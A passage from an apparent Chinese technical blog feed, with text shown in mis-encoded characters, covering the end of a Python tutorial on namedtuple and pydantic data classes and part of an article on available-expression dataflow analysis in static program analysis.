class="token string">'CP'</span><span class="token punctuation">,</span> <span class="token string">'superman'</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">)</span><span class="token punctuation">]</span>User <span class="token operator">=</span> namedtuple<span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'sex'</span><span class="token punctuation">,</span><span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> user <span class="token keyword">in</span> users<span class="token punctuation">:</span>    user <span class="token operator">=</span> User<span class="token punctuation">.</span>_make<span class="token punctuation">(</span>user<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><blockquote><p>åœ¨ä¸€èˆ¬çš„æ•°æ®å¤„ç†ä¸­ï¼Œ<code>namedtuple</code>å·²ç»èƒ½å¤Ÿå¾ˆå¥½åœ°æ»¡è¶³åŸºæœ¬çš„æ•°æ®éœ€æ±‚äº†ï¼Œä½†ç®€æ´æ˜¯å®ƒçš„ç‰¹æ€§ï¼Œä¹Ÿæ˜¯å®ƒçš„è½¯è‚‹ï¼Œä¾‹å¦‚æ— æ³•å¯¹è¾“å…¥æ•°æ®ç±»å‹ã€æ•°æ®å–å€¼èŒƒå›´è¿›è¡Œæ ¡éªŒï¼Œæ— æ³•æŒ‡å®šå¯é€‰å­—æ®µç­‰ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ›´awesomeçš„æ•°æ®ç±»æ¥å¤„ç†</p></blockquote><h2 id="dataclass-amp-pydantic"><a href="#dataclass-amp-pydantic" class="headerlink" title="dataclass &amp; pydantic"></a>dataclass &amp; pydantic</h2><p><code>dataclass</code>ä¸€å¬åå­—å°±çŸ¥é“æ˜¯ä¸“é—¨çš„æ•°æ®ç±»ï¼Œåœ¨<code>python3.7</code>çš„æ—¶å€™è¢«åŠ å…¥åˆ°æ ‡å‡†åº“ä¸­ï¼Œä½¿ç”¨çš„æ—¶å€™é€šè¿‡<code>from dataclasses import dataclass</code>å³å¯ï¼Œè™½ç„¶å®ƒå¾ˆæ–¹ä¾¿ï¼Œä½†ç”±äº<code>python3.7</code>ä¹‹åç‰ˆæœ¬çš„é™åˆ¶ï¼Œè¿™é‡Œæˆ‘ç›´æ¥è®²ä¸€ä¸ªä¸ä¹‹ç±»ä¼¼çš„ä¸“é—¨çš„æ•°æ®ç±»åº“<code>pydantic</code>ï¼ˆ<code>python3.6+</code>ï¼‰</p><ul><li><strong>å®‰è£…</strong></li></ul><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">pip install pydantic<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><h3 id="åŸºæœ¬ä½¿ç”¨-1"><a href="#åŸºæœ¬ä½¿ç”¨-1" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h3><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> typing <span class="token keyword">import</span> Optional<span class="token keyword">from</span> pydantic <span class="token keyword">import</span> validator<span class="token keyword">from</span> pydantic<span class="token punctuation">.</span>dataclasses <span class="token keyword">import</span> dataclass<span class="token keyword">from</span> pydantic <span class="token keyword">import</span> BaseModel  <span class="token comment"># class User(BaseModel):   # ä¹Ÿå¯ä»¥é€šè¿‡ç»§æ‰¿BaseModelçš„æ–¹å¼åˆå§‹åŒ–</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token punctuation">(</span>frozen<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment"># frozenä¸ºTrueè¡¨ç¤ºæ•°æ®åˆå§‹åŒ–åä¸å¯æ›´æ”¹</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">:</span>    name<span class="token punctuation">:</span> <span class="token builtin">str</span>   <span class="token comment"># æŒ‡å®šæ•°æ®ç±»å‹</span>    age<span class="token punctuation">:</span> <span class="token builtin">int</span>    sex<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'man'</span>  <span class="token comment"># è®¾ç½®é»˜è®¤å€¼</span>    address<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span>  <span class="token comment"># å¯é€‰å­—æ®µç±»å‹</span>    <span class="token decorator annotation punctuation">@validator</span><span class="token punctuation">(</span><span class="token string">"age"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">age_value_range</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;=</span> v <span class="token operator">&lt;=</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># å¹´é¾„ä¸åœ¨åˆç†èŒƒå›´å†…</span>            <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"Age can not be set out of [0,200]"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> v    user1 <span class="token operator">=</span> User<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'GentleCP'</span><span class="token punctuation">,</span> age<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">,</span> sex<span class="token operator">=</span><span class="token string">'man'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>user1<span class="token punctuation">.</span>name<span class="token punctuation">)</span>  <span class="token comment"># GentleCP</span>user2 <span class="token operator">=</span> User<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'CP'</span><span class="token punctuation">,</span> age<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> sex<span class="token operator">=</span><span class="token string">'man'</span><span class="token punctuation">,</span> address<span class="token operator">=</span><span class="token string">'Beijing'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>ä¸Šé¢çš„ä¸€ä¸ªä¾‹å­åŸºæœ¬è§£é‡Šäº†<code>pydantic</code>çš„åŸºç¡€ä½¿ç”¨ï¼Œä½†<code>pydantic</code>ä½œä¸ºä¸€ä¸ªå¼ºå¤§çš„æ•°æ®ç±»æ¥å£ï¼Œè‡ªç„¶è¿˜æœ‰æ›´å¤šçš„ç‰¹æ€§ï¼Œå› ä¸ºå¾ˆå¤šå†…å®¹æˆ‘ä»¬å®é™…ä¸Šä¹Ÿç”¨ä¸åˆ°ï¼Œè¿™é‡Œæˆ‘ä»…åˆ—ä¸¾å¸¸è§å¯èƒ½ä¼šä½¿ç”¨çš„ï¼Œå¦‚æœæ„Ÿå…´è¶£çš„å¯ä»¥è‡ªå·±å»<a href="https://pydantic-docs.helpmanual.io/">å®˜ç½‘</a>æ·±å…¥äº†è§£ã€‚</p><blockquote><p>è¿™é‡Œè¦ç‰¹åˆ«è¯´æ˜ä¸€ä¸‹ï¼Œè™½ç„¶<code>BaseModel</code>å’Œ<code>dataclass</code>ä¸¤ç§æ–¹å¼ååˆ†ç›¸ä¼¼ï¼Œä½†åŠŸèƒ½ä¸Šè¿˜æ˜¯å­˜åœ¨å·®å¼‚çš„ï¼Œå¦‚ç»§æ‰¿<code>BaseModel</code>çš„ç±»æ‹¥æœ‰å¾ˆå¤š<code>Model</code>å±æ€§ï¼Œå¦‚<code>dict(),json(),parse_obj()</code>ç­‰ï¼Œä½†<code>dataclass</code>æ˜¯æ²¡æœ‰çš„ï¼Œå®ƒåªåŒ…å«å¿…è¦çš„æ•°æ®ç±»å‹å’Œå¯¹æ•°æ®çš„éªŒè¯æ“ä½œï¼Œå› æ­¤ï¼Œå¦‚æœä½ å¸Œæœ›å¯¹ä½ çš„æ•°æ®æœ‰æ›´å¥½çš„æ“ä½œï¼Œæˆ‘å»ºè®®é€‰ç”¨<code>BaseModel</code></p></blockquote><h3 id="åŸºæœ¬æ•°æ®ç±»å‹"><a href="#åŸºæœ¬æ•°æ®ç±»å‹" class="headerlink" title="åŸºæœ¬æ•°æ®ç±»å‹"></a>åŸºæœ¬æ•°æ®ç±»å‹</h3><p>ç”¨äºåˆå§‹åŒ–çš„æ—¶å€™æŒ‡å®šæ•°æ®çš„ç±»å‹ï¼Œå¸¸ç”¨çš„å¦‚ä¸‹ï¼š</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pydantic <span class="token keyword">import</span> BaseModel<span class="token keyword">from</span> typing <span class="token keyword">import</span> Dict<span class="token punctuation">,</span> List<span class="token punctuation">,</span> Sequence<span class="token punctuation">,</span> Set<span class="token punctuation">,</span> Tuple<span class="token punctuation">,</span> Union<span class="token keyword">class</span> <span class="token class-name">Demo</span><span class="token punctuation">(</span>BaseModel<span class="token punctuation">)</span><span class="token punctuation">:</span>    a<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token comment"># æ•´å‹</span>    b<span class="token punctuation">:</span> <span class="token builtin">float</span> <span class="token comment"># æµ®ç‚¹å‹</span>    c<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token comment"># å­—ç¬¦ä¸²</span>    d<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token comment"># å¸ƒå°”å‹</span>    e<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span> <span class="token comment"># æ•´å‹åˆ—è¡¨</span>    f<span class="token punctuation">:</span> Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">]</span> <span class="token comment"># å­—å…¸å‹ï¼Œkeyä¸ºstrï¼Œvalueä¸ºint</span>    g<span class="token punctuation">:</span> Set<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span> <span class="token comment"># é›†åˆ</span>    h<span class="token punctuation">:</span> Tuple<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">]</span> <span class="token comment"># å…ƒç»„</span>    i<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">]</span>  <span class="token comment"># å¯ä»¥æ˜¯stræˆ–int</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h3 id="å­—å…¸äº’è½¬"><a href="#å­—å…¸äº’è½¬" class="headerlink" title="å­—å…¸äº’è½¬"></a>å­—å…¸äº’è½¬</h3><blockquote><p>ä»¥ä¸‹æ“ä½œåŸºäºç»§æ‰¿<code>BaseModel</code></p></blockquote><ul><li>ä¼ å…¥å­—å…¸åˆå§‹åŒ–æ•°æ®</li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">d <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'name'</span> <span class="token punctuation">:</span> <span class="token string">'CP'</span><span class="token punctuation">,</span>    <span class="token string">'age'</span> <span class="token punctuation">:</span> <span class="token number">15</span><span class="token punctuation">,</span>    <span class="token string">'sex'</span> <span class="token punctuation">:</span> <span class="token string">'man'</span><span class="token punctuation">&#125;</span>user <span class="token operator">=</span> User<span class="token punctuation">(</span><span class="token operator">**</span>d<span class="token punctuation">)</span><span class="token comment"># user = User.parse_obj(d)  # ç›´æ¥ä¼ å…¥å­—å…¸</span><span class="token comment"># user = User.parse_raw(str(d))  # è§£æå­—ç¬¦ä¸²å­—å…¸</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><ul><li>æ•°æ®è½¬æ¢æˆå­—å…¸</li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">user<span class="token punctuation">.</span><span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># user.josn()  # è½¬æ¢æˆjsonæ•°æ®</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æœ¬æ–‡ä¸»è¦è®²è§£äº†<code>python</code>ä¸­å¯¹æ•°æ®ç±»çš„å¤„ç†ï¼Œä»æœ€å¼€å§‹ç®€å•çš„å…ƒç»„ã€åˆ—è¡¨ï¼Œåˆ°æ›´å…·ç»“æ„åŒ–çš„å­—å…¸ï¼Œå†åˆ°<code>namedtuple</code>å’Œ<code>pydantic</code>ï¼Œè™½ç„¶å®ƒä»¬ä¸€ä¸ªæ¯”ä¸€ä¸ªæ›´å¼ºå¤§ï¼Œä½†å¹¶ä¸æ„å‘³ç€æ‰€æœ‰çš„åœºæ™¯ä¸­éƒ½è¦ä½¿ç”¨æŸä¸€ä¸ªï¼Œæ›´å¥½çš„æ–¹æ¡ˆæ˜¯æ ¹æ®è‡ªå·±çš„éœ€æ±‚å»ä½¿ç”¨ï¼Œä¾‹å¦‚å¦‚æœåªæ˜¯ç®€å•çš„2-3ä¸ªå­—æ®µçš„æ•°æ®ï¼Œå®é™…ä¸Šå¹¶æ²¡æœ‰å¿…è¦å¤§è´¹å‘¨ç« ï¼Œç›´æ¥ç”¨ä¸€ä¸ªå…ƒç»„æˆ–åˆ—è¡¨å³å¯ï¼Œä½†å¦‚æœä¸€ä¸ªæ•°æ®åŒ…å«å¤šä¸ªå­—æ®µï¼Œä¸”æœ¬èº«å…·æœ‰ç‰¹æ®Šå«ä¹‰ï¼Œè¿™æ—¶å€™å°±è¦è€ƒè™‘<code>namedtuple</code>æˆ–<code>pydantic</code>äº†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>namedtuple</tag>
      
      <tag>pydantic</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€é™æ€åˆ†æã€‘æ•°æ®æµåˆ†æ-Part III</title>
    <link href="/article/21446.html"/>
    <url>/article/21446.html</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸Šä¸€ç¯‡<a href="https://blog.gentlecp.com/article/1676.html">ã€é™æ€åˆ†æã€‘æ•°æ®æµåˆ†æ-Part II - æ±‚ç´¢</a> å¯¹æ•°æ®æµåˆ†æä¸­çš„<code>Live Variables Analysis</code>è¿›è¡Œäº†è¯¦è§£ï¼Œç”¨äºæŸ¥æ‰¾<code>used/unused variables</code>ï¼Œæœ¬æ–‡ç»§ç»­ç¬¬ä¸‰éƒ¨åˆ†å†…å®¹ï¼ˆä¹Ÿæ˜¯æ•°æ®æµåˆ†æçš„æœ€åä¸€éƒ¨åˆ†å†…å®¹ï¼‰â€”â€”<code>Available Expression Analysis</code>ã€‚ä¸»è¦å†…å®¹åŒ…æ‹¬ï¼š</p><ul><li><code>Available Expression Analysis</code>çš„å®šä¹‰å’Œç†è§£</li><li><code>Available Expression Analysis</code>ç®—æ³•è®¾è®¡ä¸è¯¦è§£</li><li>ä¸¾ä¸ªæ —å­</li><li>æ•°æ®æµåˆ†æä¸­çš„ä¸‰ç§åˆ†ææ–¹å¼å¯¹æ¯”</li><li>æ€»ç»“</li></ul><p>è¯»å®Œæœ¬æ–‡å›å¯¹æ•°æ®æµåˆ†æ<code>Available Expression Analysis</code></p><p>å†…å®¹æœ‰ä¸€ä¸ªåˆæ­¥çš„äº†è§£ï¼Œè§£ç­”<strong>æ˜¯ä»€ä¹ˆï¼Œæ€ä¹ˆåšï¼Œæ•ˆæœæ€ä¹ˆæ ·</strong>ä¸‰æ–¹é¢çš„é—®é¢˜ï¼ŒåŒæ—¶ä½œä¸ºæœ€åä¸€ç¯‡æ•°æ®æµåˆ†æçš„æ–‡ç« ï¼Œä¼šå°†å‰é¢ä¸¤ä¸ªéƒ¨åˆ†ä¸æœ¬æ–‡å†…å®¹åšä¸€ä¸ªæ•´ä½“çš„æ€»ç»“ï¼Œä»¥è¡¨æ ¼å½¢å¼å¯¹æ¯”ä¸‰è€…ï¼ŒåŠ æ·±å¯¹æ•°æ®æµåˆ†æä¸‰ç§åˆ†ææ–¹å¼çš„ç†è§£ã€‚</p><blockquote><p>æœ¬æ–‡ä¸­æ¶‰åŠçš„ä¸€äº›ä¸“ä¸šæœ¯è¯­æˆ–å®šä¹‰å¯åœ¨<a href="https://blog.gentlecp.com/article/19520.html">Part I</a>ä¸­æ‰¾åˆ°ï¼Œå¼ºçƒˆå»ºè®®æŒ‰é¡ºåºé˜…è¯»å‰ä¸¤ç¯‡æ–‡ç« ï¼Œæœ¬æ–‡ä¸å†é‡å¤èµ˜è¿°</p></blockquote><h2 id="Available-Expression-Analysis"><a href="#Available-Expression-Analysis" class="headerlink" title="Available Expression Analysis"></a>Available Expression Analysis</h2><p>å³å¯ç”¨è¡¨è¾¾å¼åˆ†æï¼Œé¦–å…ˆæ˜ç¡®åˆ†æå¯¹è±¡æ˜¯è¡¨è¾¾å¼ï¼Œç±»ä¼¼<code>x op y</code>è¿™ç§ï¼Œä¸‹é¢çœ‹ä¸€ä¸‹å®šä¹‰ï¼š</p><div class="note note-info">            <p>å¯¹äºç»™å®šçš„ä¸€ä¸ª<code>program point</code> pï¼Œè¡¨è¾¾å¼å¯ç”¨çš„å‰ææ˜¯ï¼š</p><ol><li>æ‰€æœ‰ä»<code>entry</code>åˆ°pçš„è·¯å¾„éƒ½å¿…é¡»ç»è¿‡å¯¹è¯¥è¡¨è¾¾å¼<code>x op y</code>çš„æ‰§è¡Œï¼ˆä¹Ÿå³è¯¥è·¯å¾„ä¸Šå¿…é¡»è‡³å°‘å‡ºç°ä¸€æ¬¡è¯¥è¡¨è¾¾å¼ï¼‰</li><li>åœ¨è¡¨è¾¾å¼<code>x op y</code> æœ€åä¸€æ¬¡æ‰§è¡Œä¹‹åï¼Œæ²¡æœ‰å¯¹xï¼Œyçš„é‡å®šä¹‰</li></ol>          </div><p>ç”¨äººè¯è§£é‡Šä¸€ä¸‹å°±æ˜¯ï¼Œåœ¨ç¨‹åºçš„æŸä¸€é˜¶æ®µ<code>program point p</code>ï¼Œæˆ‘ä»¬æ‰“ç®—ç›´æ¥ç”¨æŸä¸ªå˜é‡å»æ›¿ä»£ä¸€ä¸ªè¡¨è¾¾å¼äº†ï¼ˆé¿å…å¤šæ¬¡è®¡ç®—ï¼‰ï¼Œè¿™å°±éœ€è¦ä¿è¯è¯¥è¡¨è¾¾å¼ä¸­æ¶‰åŠçš„å˜é‡æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼ˆå‰æ2ï¼‰ï¼ŒåŒæ—¶æ‰€æœ‰è·¯å¾„çš„è¡¨è¾¾å¼éƒ½è¦å‡ºç°è¿‡ä¸”åº”è¯¥è¦ä¸€è‡´ï¼ˆå‰æ1ï¼‰ï¼Œè¿™æ ·å°±èƒ½ä¿è¯è¯¥å˜é‡ä¸è¡¨è¾¾å¼è®¡ç®—çš„å€¼æ˜¯ä¸€è‡´çš„ã€‚</p><p>çœ‹ä¸€ä¸‹ä¸‹é¢çš„ä¾‹å­ï¼š</p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210331111054.png" alt="image-20210331111054673" style="zoom:50%;" /></p><p>ç¨‹åºå—è¾“å…¥<code>IN=&#123;a+b&#125;</code>ï¼Œç»è¿‡æ‰§è¡Œ<code>a=x op y</code>åï¼Œæ·»åŠ æ–°çš„è¡¨è¾¾å¼<code>x op y</code>åˆ°è¾“å‡ºä¸­ï¼ŒåŒæ—¶å› ä¸ºaè¢«é‡å®šä¹‰äº†ï¼Œæ‰€ä»¥è¡¨è¾¾å¼<code>a+b</code>ä»é›†åˆä¸­å»é™¤ï¼Œæœ€ç»ˆç»“æœè¾“å‡º<code>OUT=&#123;x op y&#125;</code></p><p>åŒæ ·ï¼Œé’ˆå¯¹<code>Available Expression Analysis</code>ï¼Œä¹Ÿè¦æ˜ç¡®<code>Abstraction</code>,<code>Transfer Function</code>,<code>Control Flow</code>ã€‚</p><h3 id="Abstraction"><a href="#Abstraction" class="headerlink" title="Abstraction"></a>Abstraction</h3><p>å¯¹è±¡æ˜¯è¡¨è¾¾å¼ï¼Œæ²¡å¾—è¯´äº†ï¼Œå‡è®¾æœ‰è¡¨è¾¾å¼<code>E1,E2,...En</code>ï¼Œåˆ™å®šä¹‰1è¡¨ç¤º<code>available</code>ï¼Œ0è¡¨ç¤º<code>unavailable</code>ï¼Œæ˜“å¾—<code>bit vector</code>è¡¨ç¤ºï¼š<code>000..000</code></p><h3 id="Transfer-Function"><a href="#Transfer-Function" class="headerlink" title="Transfer Function"></a>Transfer Function</h3><p>åœ¨å‰é¢çš„ä¾‹å­ä¸­å·²ç»ä½“ç°å‡ºäº†<code>transfer function</code>çš„æ ¸å¿ƒè¦ç‚¹ï¼š</p><ol><li>å°†æ–°çš„è¡¨è¾¾å¼$gen_B$åŠ å…¥è¾“å‡ºä¸­</li><li>ä»è¾“å‡ºä¸­å»é™¤å«é‡å®šä¹‰å˜é‡çš„è¡¨è¾¾å¼$def_B$</li></ol><p>å› æ­¤ï¼Œæ˜¾ç„¶æœ‰ï¼š</p><script type="math/tex; mode=display">OUT[B] = gen_B \bigcup (IN[B]-def_B)</script><p>å…³äºå…ˆ<code>gen</code>è¿˜æ˜¯<code>kill</code>ï¼Œå°±çœ‹è¯­å¥çš„æ‰§è¡Œä¹¦é¡ºåºï¼Œä¾‹å¦‚ï¼š</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># e.g. 1</span>x <span class="token operator">=</span> x <span class="token operator">+</span> y  <span class="token comment"># å…ˆgen x+yï¼Œåˆå› ä¸ºxè¢«redefinedï¼Œkill x+y</span><span class="token comment"># e.g. 2</span>a <span class="token operator">=</span> x <span class="token operator">+</span> y  <span class="token comment"># kill açš„è¡¨è¾¾å¼</span>c <span class="token operator">=</span> a <span class="token operator">+</span> b  <span class="token comment"># æ–°ç”Ÿæˆa+b</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h3 id="Control-Flow"><a href="#Control-Flow" class="headerlink" title="Control Flow"></a>Control Flow</h3><p>è¿™ä¸€å—å’Œä¹‹å‰ä¸¤ç§åˆ†ææ–¹å¼éƒ½ä¸ä¸€æ ·äº†ï¼Œå› ä¸ºæ ¹æ®å®šä¹‰ï¼Œæ‰€æœ‰çš„pathéƒ½åº”è¯¥è¦æœ‰è¯¥è¡¨è¾¾å¼çš„æ‰§è¡Œï¼ˆå‡è®¾å­˜åœ¨ä¸€æ¡è·¯å¾„æ²¡æœ‰ï¼Œé‚£ä¹ˆä¸€æ—¦æ‰§è¡Œåˆ°è¿™æ¡è·¯å¾„ï¼ŒæŸå˜é‡å’Œè¡¨è¾¾å¼çš„å€¼å°±ä¸ä¸€å®šç›¸ç­‰äº†ï¼‰ï¼Œå› æ­¤ä»å¤šè¾“å‡ºèšåˆåˆ°è¾“å…¥çš„è¿‡ç¨‹ä¸­ï¼Œåº”è¯¥é‡‡ç”¨äº¤é›†ï¼š</p><script type="math/tex; mode=display">IN[B] = \bigcap_{P\ a\ predecessor\ of\ B}OUT[P]</script><h2 id="Available-Expression-Analysis-ç®—æ³•è®¾è®¡"><a href="#Available-Expression-Analysis-ç®—æ³•è®¾è®¡" class="headerlink" title="Available Expression Analysis ç®—æ³•è®¾è®¡"></a>Available Expression Analysis ç®—æ³•è®¾è®¡</h2><p>æœ‰è¿‡å‰é¢ä¸¤æ¬¡çš„è®¾è®¡ç»éªŒï¼Œè¿™éƒ¨åˆ†åº”è¯¥é©¾è½»å°±ç†Ÿäº†ï¼Œè¾“å…¥è¾“å‡ºéƒ½æ˜¯å·®ä¸å¤šçš„ï¼Œéœ€è¦ç‰¹åˆ«æ˜ç¡®çš„ä¸€ç‚¹æ˜¯åˆå§‹åŒ–çš„éƒ¨åˆ†ï¼š</p><ol><li>ä¸€å¼€å§‹æ‰€æœ‰çš„<code>expression</code>éƒ½åº”è¯¥æ˜¯<code>unavilable</code>ï¼Œæ‰€ä»¥å¯¹$OUT[entry]=\phi$</li><li>å¯¹æ‰€æœ‰<code>OUT[B]</code>å°±ä¸ä¸€æ ·äº†ï¼Œå› ä¸ºå‰é¢è¯´åˆ°æˆ‘ä»¬è¦å¯¹æ‰€æœ‰å‰é©±è¾“å‡ºåšäº¤é›†å¾—åˆ°ä¸‹ä¸€<code>BB</code>çš„è¾“å…¥ï¼Œå¦‚æœåˆå§‹åŒ–çš„æ—¶å€™å‰é©±<code>BB</code>éƒ½æ˜¯0ï¼Œé‚£æ„å‘³ç€ç»“æœä¸€å®šéƒ½ä¸º0ï¼Œè¿™æ ·å°±æ²¡æœ‰èµ·åˆ°å¯¹<code>IN[BB]</code>çš„æ›´æ–°æ•ˆæœï¼Œå› æ­¤ï¼Œé™¤<code>entry</code>å¤–çš„<code>BB</code>åˆå§‹åŒ–$OUT[B] = \cup(1)$</li></ol><p>å…¶ä»–çš„å®é™…ä¸Šå’Œ<code>Reaching definition analysis</code>æ²¡ä»€ä¹ˆå·®åˆ«ï¼Œå¾ªç¯è¿­ä»£ç›´åˆ°<code>OUT</code>ä¸å†äº§ç”Ÿå˜åŒ–ï¼Œå…·ä½“ç®—æ³•æè¿°å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210331184554.png" alt="image-20210331184554736"></p><h2 id="ä¸¾ä¸ªæ —å­"><a href="#ä¸¾ä¸ªæ —å­" class="headerlink" title="ä¸¾ä¸ªæ —å­"></a>ä¸¾ä¸ªæ —å­</h2><p>ä¸‹é¢é€šè¿‡ä¸€ä¸ªå…·ä½“çš„æ ·ä¾‹æ¥åŠ æ·±å¯¹ç®—æ³•è¿‡ç¨‹çš„ç†è§£ï¼Œä¸ä¹‹å‰ä¸€æ ·ï¼Œå—é™äºæ–‡ç« å†…å®¹ï¼Œåªç»™å‡º<strong>åˆå§‹</strong>å’Œ<strong>ç»“æŸ</strong>çŠ¶æ€ï¼š</p><ul><li><strong>èµ·å§‹</strong>ï¼šå‡è®¾æŸCFGå¦‚ä¸‹ï¼š</li></ul><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210331185623.png" alt="image-20210331185623145"></p><blockquote><p>å·¦ä¸Šè§’æ˜¯ç¨‹åºä¸­å‡ºç°çš„è¡¨è¾¾å¼</p></blockquote><ul><li><strong>ç»“æŸ</strong></li></ul><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210331185715.png" alt="image-20210331185715022"></p><blockquote><p>æ•´ä¸ªè¿‡ç¨‹å®é™…ä¸ŠåŸºæœ¬ä¸Šå’Œ<code>Reaching Definition Analysis</code>ååˆ†ç›¸è¿‘ï¼Œåªä¸è¿‡åœ¨åˆå§‹åŒ–å’Œ<code>Transfer Function</code>,<code>Control Flow</code>çš„è¡¨è¾¾å¼ä¸Šä¸åŒ</p></blockquote><h2 id="ä¸‰ç§åˆ†ææ–¹å¼å¯¹æ¯”"><a href="#ä¸‰ç§åˆ†ææ–¹å¼å¯¹æ¯”" class="headerlink" title="ä¸‰ç§åˆ†ææ–¹å¼å¯¹æ¯”"></a>ä¸‰ç§åˆ†ææ–¹å¼å¯¹æ¯”</h2><p>ä¸‹å›¾å±•ç¤ºäº†<code>Reaching Definition Analysis, Live Variables Analysis, Available Expression Analysis</code>ä¸‰ç§åˆ†ææ–¹å¼çš„å¯¹æ¯”ï¼š</p><div class="table-container"><table><thead><tr><th></th><th>Reaching Definitions</th><th>Live Variables</th><th>Available Expressions</th></tr></thead><tbody><tr><td><strong>Domain</strong>(åˆ†æå¯¹è±¡)</td><td>definitions</td><td>variables</td><td>expressions</td></tr><tr><td><strong>Direction</strong>(åˆ†ææ–¹å‘)</td><td>forward</td><td>backward</td><td>forward</td></tr><tr><td><strong>May/Must</strong>(å­˜åœ¨/å…¨éƒ¨)</td><td>may</td><td>may</td><td>must</td></tr><tr><td><strong>Boundary</strong>(è¾¹ç•Œ)</td><td>$OUT[entry]=\phi$</td><td>$IN[exit]=\phi$</td><td>$OUT[entry]=\phi$</td></tr><tr><td><strong>Initialization</strong>(åˆå§‹åŒ–)</td><td>$OUT[B]=\phi$</td><td>$IN[B]=\phi$</td><td>$OUT[B]=\cup$</td></tr><tr><td><strong>Transfer Function</strong></td><td>$OUT[B]=gen_B\bigcup(IN[B]-kill_B)$</td><td>$IN[B]=use_B\bigcup(IN[B]-def_B)$</td><td>$OUT[B]=gen_B\bigcup(IN[B]-def_B)$</td></tr><tr><td><strong>Meet</strong>($\cup/\cap$)</td><td>$\cup$</td><td>$\cup$</td><td>$\cap$</td></tr></tbody></table></div><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æœ¬æ–‡ç€é‡è®²è§£äº†æ•°æ®æµåˆ†æä¸­çš„<code>Available Expression 